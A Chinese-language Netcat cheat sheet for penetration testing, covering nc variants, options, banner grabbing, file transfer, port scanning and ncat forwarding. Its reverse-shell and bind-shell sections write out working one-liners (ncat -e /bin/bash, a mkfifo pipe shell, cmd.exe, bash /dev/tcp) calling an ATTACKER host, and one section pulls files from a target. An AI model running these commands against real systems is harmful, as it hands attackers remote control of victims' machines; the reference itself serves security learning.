# Netcat

Netcat（nc）被称为"网络安全界的瑞士军刀"，用于建立原始 TCP/UDP 连接：读写数据、监听端口、抓取横幅、传文件、起 Shell。没有协议限制，curl 只能发 HTTP，nc 什么都能发。

## 一、实现差异（先看这个）

不同发行版带的 nc 功能差别很大，**最大的坑是 `-e`（连接后执行命令）并非所有版本都有**：

| 实现             | 常见位置                                     | 有 `-e` | 有 `-z`（扫描） | 有 `-k`（保持监听）     | 说明                          |
| -------------- | ---------------------------------------- | ------ | ---------- | ---------------- | --------------------------- |
| netcat-openbsd | Debian/Ubuntu 的 `nc`                     | 无      | 有          | 有                | 默认 `nc`，安全考量移除了 `-e`        |
| ncat（Nmap）     | Kali 的 `nc`/`ncat`                       | 有      | 无          | 有（`--keep-open`） | 功能最全，支持 `--ssl`、`--sh-exec` |
| 传统 netcat      | `netcat-traditional` 包的 `nc.traditional` | 有      | 有          | 无                | 老古董，用 `-p` 指定端口             |

> 判断方法：`nc -h` 帮助里有 `-e` 就是支持执行命令的版本。反弹 Shell 前先确认目标机上的 nc 类型，否则 `-e` 会直接报 "invalid option"。

## 二、基本语法

```bash
nc [选项] <目标主机> <端口>   # 连接模式
nc -l [选项] <端口>           # 监听模式（等待别人连进来）
```

> 监听时端口直接作为位置参数（netcat-openbsd 写法）；`nc -lvnp 4444` 这种带 `-p` 的写法在 ncat 和兼容模式下仍可用。传统版必须用 `-p` 指定端口。

## 三、常用选项速查

| 选项          | 说明                              |
| ----------- | ------------------------------- |
| `-l`        | 监听模式，等待入站连接                     |
| `-v`        | 详细输出（连接成功、收到 banner 时会显示）       |
| `-n`        | 不做 DNS 解析（只认 IP，加快速度）           |
| `-z`        | 零 I/O 扫描模式，只测端口通不通（openbsd/传统版） |
| `-w <SEC>`  | 连接/空闲超时秒数（扫描必用，防止挂住）            |
| `-q <SEC>`  | 收到 EOF 后等待 N 秒再退出；`-q 0` 立即退出   |
| `-k`        | 监听端断开后不退出，继续等待新连接（openbsd/ncat） |
| `-N`        | 收到 EOF 后关闭 socket（openbsd）      |
| `-u`        | UDP 模式                          |
| `-i <SEC>`  | 发送/接收行之间的间隔秒数                   |
| `-e <CMD>`  | 连接建立后执行命令（仅 ncat/传统版）           |
| `-s <IP>`   | 指定源 IP（连接时）                     |
| `-4` / `-6` | 强制 IPv4 / IPv6                  |

> 注意：openbsd 版的 `-S` 是 TCP MD5 签名，**不是** SSL。要做 TLS 加密连接用 ncat 的 `--ssl`。

---

## 四、监听与连接

```bash
# 监听 4444 端口（攻击机常用）
nc -lvn 4444

# 连接目标
nc TARGET 4444

# 两边都起来后，任何一端输入的文字都会实时传给另一端（双向通信）
```

---

## 五、横幅抓取与协议交互

```bash
# 连上去后目标可能直接吐 banner（SMTP/FTP/SSH 版本等）
nc -vn TARGET 80

# 手工发原始 HTTP 请求
printf "GET / HTTP/1.1\r\nHost: TARGET\r\nConnection: close\r\n\r\n" | nc -w 3 TARGET 80

# 交互式：nc TARGET 8080 后手动敲入协议命令
nc TARGET 21
220 (vsFTPd 2.3.4)...
USER anonymous
```

> `-w 3` 很重要：很多服务不会主动关闭连接，不设超时 nc 会一直挂在那。

---

## 六、反弹 Shell

攻击机先监听，受害者回连：

```bash
# 攻击机（本机）
nc -lvn 4444
```

受害者端，按 nc 变体选一个：

```bash
# 有 -e 的版本（ncat / 传统 nc）
ncat -e /bin/bash ATTACKER 4444

# 无 -e 的 netcat-openbsd：用 FIFO 管道模拟
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER 4444 > /tmp/f

# 受害者是 Windows
ncat -e cmd.exe ATTACKER 4444
```

> 受害机上不一定有 nc。没有时可用 bash 内建 `/dev/tcp` 回连：`bash -i >& /dev/tcp/ATTACKER/4444 0>&1`。

---

## 七、绑定 Shell

受害者监听，攻击者主动连入（适合受害者在 NAT 内、无法回连的场景）：

```bash
# 受害者开启绑定 Shell（有 -e 的版本）
ncat -lvnp 4444 -e /bin/bash

# 攻击者连接
nc ATTACKER 4444
```

---

## 八、文件传输

```bash
# 接收方（攻击机）先监听
nc -lvn 4444 > received.txt

# 发送方（目标机）把文件推过来
nc ATTACKER 4444 < file.txt
```

> 坑：发送方 stdin 到 EOF 后，openbsd 版 nc 不会立刻关连接，接收方会挂住收尾。发送端加 `-q 0`（或 openbsd 版加 `-N`）保证发完即关：

```bash
cat file.txt | nc -q 0 ATTACKER 4444
```

---

## 九、端口扫描

```bash
# 批量测端口连通性（-z 不发送数据）
nc -zv -w 1 TARGET 22 80 443
nc -zv -w 1 TARGET 1-1000

# UDP 端口测试
nc -uzv -w 1 TARGET 53 161
```

> `-z` 在 ncat 里不存在（Kali 的 `nc` 就是 ncat）。且 nc 扫描无 SYN 半开等隐蔽特性、速度也不如 nmap，只在目标机上没有 nmap 时才用它临时顶一下。

---

## 十、UDP 通信

```bash
# UDP 客户端
nc -u TARGET 53

# UDP 监听
nc -luvn 4444
```

> UDP 无连接状态，通不通要看对方有没有回包，超时判断主要靠 `-w`。

---

## 十一、端口转发 / 代理（ncat）

```bash
# 把本地 8080 转发到内网 TARGET:80（跳板机思路）
ncat -lvn 8080 --sh-exec "ncat TARGET 80"

# 以 root 权限转发到低端口（Linux <1024 需要权限）
ncat -lvn 80 --sh-exec "ncat TARGET 8080"
```

---

## 十二、ncat 高级功能

```bash
# TLS 加密通信
ncat --ssl TARGET 443
ncat -lvn 4444 --ssl --ssl-cert server.pem --ssl-key server.key

# 保持监听，接受多次连接（-k）
ncat -lvn 4444 -k

# 中转 / 聊天服务器（多客户端广播）
ncat --broker --listen 4444

# 只收不送 / 只送不收（文件传输收尾更稳）
ncat -lvn 4444 --recv-only > file.txt
```

---

## 记忆要点

- **先分清 nc 变体**：`-e` 只有 ncat/传统版有；openbsd 版用 FIFO 管道替代；Kali 的 `nc` 其实是 ncat
- **扫描用 `-z -w 1`**，不设超时端口挂了会卡住
- **协议交互要加 `-w 3`**，服务不关连接时 nc 会一直挂着
- **文件传输发送端加 `-q 0`**，否则 EOF 后连接不收，接收端无法收尾
- **监听端口写法**：openbsd 用位置参数 `nc -lvn 4444`，传统版必须 `-p 4444`，`-lvnp` 写法全兼容
- **TLS 用 ncat `--ssl`**，别把 openbsd 的 `-S`（TCP MD5 签名）当成 SSL
- 反弹 Shell 首选 `-e`，无 `-e` 时 mkfifo 管道是通用替代；都没有就用 bash `/dev/tcp`
